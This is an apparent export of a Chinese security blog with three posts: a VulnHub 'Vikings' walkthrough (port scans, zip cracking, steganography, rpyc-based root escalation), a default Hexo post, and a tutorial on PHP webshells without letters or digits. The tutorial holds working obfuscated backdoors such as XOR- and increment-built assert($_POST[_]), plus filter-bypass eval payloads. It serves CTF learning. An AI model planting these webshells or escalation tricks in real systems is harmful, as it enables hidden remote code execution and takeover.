[{"title":"Viking","url":"/2021/12/01/Viking/","content":"靶机介绍本靶机解密风格很重，比较像ctf\n靶机地址：https://download.vulnhub.com/vikings/Vikings.ova\n目标：拿到2个flag\n难度：低\n信息搜集arp-scan -l\n\n扫描网段内所有主机，确认目标靶机地址\nnmap -p- 192.168.56.112\n\n对靶机进行全端口扫描，扫出来了22和80端口\nnmap -p22,80 -A 192.168.56.112\n\n对两个端口的服务进行扫描\nPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 59:d4:c0:fd:62:45:97:83:15:c0:15:b2:ac:25:60:99 (RSA)|   256 7e:37:f0:11:63:80:15:a3:d3:9d:43:c6:09:be:fb:da (ECDSA)|_  256 52:e9:4f:71:bc:14:dc:00:34:f2:a7:b3:58:b5:0d:ce (ED25519)80/tcp open  http    Apache httpd 2.4.29| http-ls: Volume /| SIZE  TIME              FILENAME| -     2020-10-29 21:07  site/|_|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Index of /\n\n\n\n路径爆破gobuster这个工具已经赢dirsearch太多\ngobuster dir -r -u http://192.168.56.112/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php,html -o dir-common.log\n\n扫描发现：/war.txt              (Status: 200) [Size: 13]  \n提示我们转到 http://192.168.56.112/site/war-is-over/\n这个页面，返回一串类似base64的长数据，我们用kali保存数据到本地\ncurl http://192.168.56.112/site/war-is-over/|base64 -d &gt;output\n\n\n\nfile查看文件类型\n┌──(root💀kali)-[~]└─# file output                                                                                                                         output: Zip archive data, at least v5.1 to extract\n\n但是解压需要密码，此处我们不知道密码，看看能不能爆破\n爆破压缩包密码工具：john\nzip2john output.zip &gt;&gt; passwd.txtjohn passwd.txt --wordlist=/usr/share/wordlists/rockyou.txt \n\n很快爆破出了密码：ragnarok123\n压缩包里是一张图片，根据经验应该是隐写\n图片隐写比较低级的隐写，binwalk分离\n//FamousBoatbuilder_floki@vikings                                     //f@m0usboatbuilde7 \n\nssh成功登录为floki用户\nuid=1000(floki) gid=1000(floki) groups=1000(floki),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)\n\n\n\n两个可疑的文本，可能对接下来的解题有帮助\nfloki@vikings:~$ cat readme.txt _______________________________________________________________________Floki-Creation____________________________________________________________________________________________________I am the famous boat builder Floki. We raided Paris this with our all might yet we failed. We don&#x27;t know where Ragnar is after the war. He is in so grief right now. I want to apologise to him.Because it was I who was leading all the Vikings. I need to find him. He can be anywhere. I need to create this `boat` to find Ragnarfloki@vikings:~$ cat boat#Printable chars are your ally.#num = 29th prime-number.collatz-conjecture(num)\n\n\n\n查看/etc/passwd\nfloki:x:1000:1000:floki:/home/floki:/bin/bashragnar:x:1001:1001::/home/ragnar:/bin/sh\n\n\n\n提权用户组108(lxd)给我们可以提权的机会，参考：https://www.freebuf.com/articles/system/216803.html\n但是这里依照靶机的意思我们继续解谜\n==》I need to create this boat to find Ragnar\nboat是我们提权到Ragnar用户的关键\nboat:\n#Printable chars are your ally.#num = 29th prime-number.collatz-conjecture(num)\n\n可打印的字符是我们要找的对象\nnum是第二九个素数，109\ncollatz猜想：https://zh.wikipedia.org/wiki/%E8%80%83%E6%8B%89%E5%85%B9%E7%8C%9C%E6%83%B3\n\n考拉兹猜想（英语：Collatz conjecture），又称为奇偶归一猜想、3n+1猜想、冰雹猜想、角谷猜想、哈塞猜想、乌拉姆猜想或叙拉古猜想，是指对于每一个正整数，如果它是奇数，则对它乘3再加1，如果它是偶数，则对它除以2，如此循环，最终都能够得到1。\n\n#ascii 0-255可打印\n编写脚本：\ni = 109c = [i]while i!=1:    if(i%2) == 1:        i = i * 3 + 1    else:        i = i//2    if(i&lt;256):        c.append(i)print(c)str = &#x27;&#x27;for n in c:    str = str + chr(n)print(str)\n\nm¤R)|&gt;^/GÖk¡òy¶[Îg¯§ûôz=¸\\.F#j5 P(再筛选出中间可被键盘输出的字符，这里我们可以用cyberchef\n\n\n猜测mR)|&gt;^/Gky[gz=.F#j5P(为Ragnar用户的密码\nssh登录成功\n这里登录的时候会请求ragnar的sudo密码，应该是系统初始的时候执行的命令\n总之先拿到了ragnar的权限\n$ iduid=1001(ragnar) gid=1001(ragnar) groups=1001(ragnar)\n\n升级一下shell到bash\nSHELL=/bin/bash script -q /dev/null\n\n拿到第一个flag\nragnar@vikings:~$ cat user.txt4bf930187d0149a9e4374a4e823f867d\n\n\n\nrpc提权因为登录ragnar用户时，系统会自动sudo，我们可以看下这些预先储存好的命令\n.profile, .bashrc, .bash_profile, /etc/profile, etc. \n当我们检查.profile文件时，我们会发现这一行命令\nsudo python3 /usr/local/bin/rpyc_classic.py\n\n\n\n虽然用户没有权限，但是我们仍然可以看一下有没有rpyc server在跑\n\n计算机网络课中我们学过，rpc是用来实现远程调用的\nrpyc文档：https://rpyc.readthedocs.io/en/latest/index.html\n\nragnar@vikings:~$ netstat -tnlp(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.1:18812         0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.1:42945         0.0.0.0:*               LISTEN      -         \n\n既然他打开了服务端口，我们可以本地写一个脚本去连他的服务端，这样在服务端就有可能以root用户执行命令\n（反弹shell失败了，这里更改ragnar用户的权限）\nimport rpycdef getshell():    import os    os.system(&quot;sudo usermod -a -G sudo ragnar&quot;) conn = rpyc.classic.connect(&quot;localhost&quot;)fn = conn.teleport(getshell)fn()\n\n运行脚本后，ragnar已经有了sudo权限，重新用ragnar用户登录靶机，即可提权到root\nroot@vikings:/# cat root/root.txtf0b98d4387ff6da77317e582da98bf31\n\n拿到第二个flag\n","categories":["web"],"tags":["vulnhub"]},{"title":"Hello World","url":"/2021/11/29/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\nimage Test\n利贺田\n"},{"title":"php无字母数字构造-入门级","url":"/2021/11/30/php%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0%E5%85%A5%E9%97%A8/","content":"1    前置知识1.1    php中的正则匹配函数最常见的preg_grep()\npreg_grep(string $pattern, array $array, int $flags = 0): array|false\n返回给定数组array中与模式pattern 匹配的元素组成的数组\n其余的正则函数可以在https://www.runoob.com/php/php-pcre.html里学习\n1.2     正则匹配式正则表达式手册：https://tool.oschina.net/uploads/apidocs/jquery/regexp.html\nhttps://www.runoob.com/regexp/regexp-tutorial.html\n动态调试正则表达式的网站：https://regex101.com/\n中文在线调试：https://c.runoob.com/front-end/854/\n尝试阅读几个正则表达式：\n/^[a-z0-9_-]&#123;3,16&#125;$/\t\t用来过滤用户名/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/\t\t匹配ip地址/^[a-z\\d]+(\\.[a-z\\d]+)*@([\\da-z](-[\\da-z])?)+(\\.&#123;1,2&#125;[a-z]+)+$/电子邮箱\n\n1.3    php中的位运算在构造字符绕正则的时候，我们常用位运算符来帮助我们构造\nphp位运算符：https://blog.csdn.net/qq_28602957/article/details/52141431\n2    无字母数字构造2.1    无字母数字基础&lt;?phpif(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) &#123;  eval($_GET[&#x27;shell&#x27;]);&#125;\n\n\nphp5\n修饰符i，s：https://www.runoob.com/regexp/regexp-flags.html\n\n异或拼接：\n（来自p牛博客\n&lt;?php$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;$___=$$__;$_($___[_]); // assert($_POST[_]);\n\n(很多不可打印字符，用url编码表示)\n异或:\n(&quot;%0b%08%0b%09%0e%06%0f&quot;^&quot;%7b%60%7b%60%60%60%60&quot;)();\n\n这样可以phpinfo\n倘若过滤了引号：\n$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo\n\n%86%86%86%86^%d9%c1%c3%d2构造出_GET,php中可以这样构造参数,花括号在数组中可以索引：\n$_GET&#123;2&#125;\n\n\n\n一个非数字字母的php后门（使用异或）：\n// demo1.php&lt;?php    @$_++; // $_ = 1    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _    $__.=(&quot;.&quot;^&quot;~&quot;); // _P    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS    $__.=(&quot;&#123;&quot;^&quot;/&quot;); // _POST     $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);?&gt;\n\n拼接_POST:\n$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);\n\n更短的字符：\n&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot; //_GET&quot;#./|&#123;&quot;^&quot;|~`//&quot; //_POST\n\n\n\n或：\n(&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;)();\n\n这样可以phpinfo\n(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%17%08%0f%01%0d%09&quot;|&quot;%60%60%60%60%60%60&quot;);\n\nsystem(‘whoami’); 可以rce\n取反：\n(~%8F%97%8F%96%91%99%90)();\n\n可phpinfo\nutf-8下取中文字符取反：\nUTF-8编码的某个汉字，并将其中某个字符取出来，比如’和’{2}的结果是”\\x8c”，其取反即为字母s\n&lt;?php$_=&quot;和&quot;;print(~($_&#123;2&#125;));print(~&quot;\\x8c&quot;);?&gt;\n\n脚本生成：\n&gt;&gt;&gt; def get(shell):...     hexbit=&#x27;&#x27;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))...     print(hexbit)...&gt;&gt;&gt; get(&#x27;phpinfo&#x27;)0x8f0x970x8f0x960x910x990x90\n\n\n\n自增：\n‘a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。\n文档：http://php.net/manual/zh/language.operators.increment.php\n如何拿到一个值为字符串’a’的变量呢？\n数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。\n在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：\n&lt;?phpecho &#x27;&#x27;.[];//Array\n\n构造：ASSERT($_POST[_]);\n&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#xn\n\n\n//测试发现7.0.12以上版本不可使用//使用时需要url编码下$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);固定格式 构造出来的 assert($_POST[_]);然后post传入   _=phpinfo();\n\n\n\n不用数字构造数字：\necho (&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)+(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);//2echo true+true;//2\n\n或者：\n&lt;?php$_++;print($_); // 1?&gt;php中未定义的变量默认值为null，nullfalse0\n\n\n\n2.2    长度限制&lt;?phpif(isset($_GET[&#x27;code&#x27;]))&#123;    $code = $_GET[&#x27;code&#x27;];    if(strlen($code)&gt;35)&#123;        die(&quot;Long.&quot;);    &#125;    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;        die(&quot;NO.&quot;);    &#125;    eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;\n\nphp7:\nPHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。\n(~%8F%97%8F%96%91%99%90)();\n\n\n\nphp5:\n上传临时文件：\nimport requestsurl=&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;files=&#123;&#x27;file&#x27;:&#x27;cat f*&#x27;&#125;response=requests.post(url,files=files)html = response.textprint(html)\n\n具体原理看p神文章可了解详细\nglob通配符：https://man7.org/linux/man-pages/man7/glob.7.html\n2.3    过滤下划线&lt;?phpinclude &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123;    $code = $_GET[&#x27;code&#x27;];    if(strlen($code)&gt;50)&#123;        die(&quot;Too Long.&quot;);    &#125;    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code))&#123;        die(&quot;Not Allowed.&quot;);    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;//$hint =  &quot;php function getFlag() to get flag&quot;;?&gt;\n\n\n\n异或：\n?code=(&#x27;$&#x27;).(&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;).([&#x27;+&#x27;])&amp;+=getFlag();\n\n这样是错误的，因为eval只能解析一遍代码，而此时中间的拼接就会成为第一遍解析的运算\n正确的payload为：\n?code=$&#123;&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;&#125;[&#x27;+&#x27;]();&amp;+=getFlag\n\n这里利用了**${}**中的代码是可以执行的特点，其实也就是可变变量。\n示例：\n&lt;?php    $a = &#x27;hello&#x27;;    $$a = &#x27;world&#x27;;    echo &quot;$a $&#123;$a&#125;&quot;;?&gt;        &gt;&gt;hello world\n\n\n\n取反：\n?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag其中24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B = $&#123;~&quot;\\xa0\\xb8\\xba\\xab&quot;&#125; = $_GET~在&#123;&#125;中执行了取反操作\n\n\n\n2.4    过滤$字符&lt;?php include &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123;    $code=$_GET[&#x27;code&#x27;];    if(strlen($code)&gt;35)&#123;    die(&quot;Long.&quot;);    &#125;    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))    &#123;        die(&quot;NO.&quot;);    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;//$hint=&quot;php function getFlag() to get flag&quot;;?&gt;\n\npayload:\ncode=?&gt;&lt;?=`/???/??? ????.???`?&gt;/???/???通配``/bin/cat，???.???通配flag.php`\n\n\n\n\n\n参考：\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\nhttps://ca01h.top/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/\nhttps://blog.csdn.net/miuzzx/article/details/109143413\n","categories":["web"],"tags":["php"]}]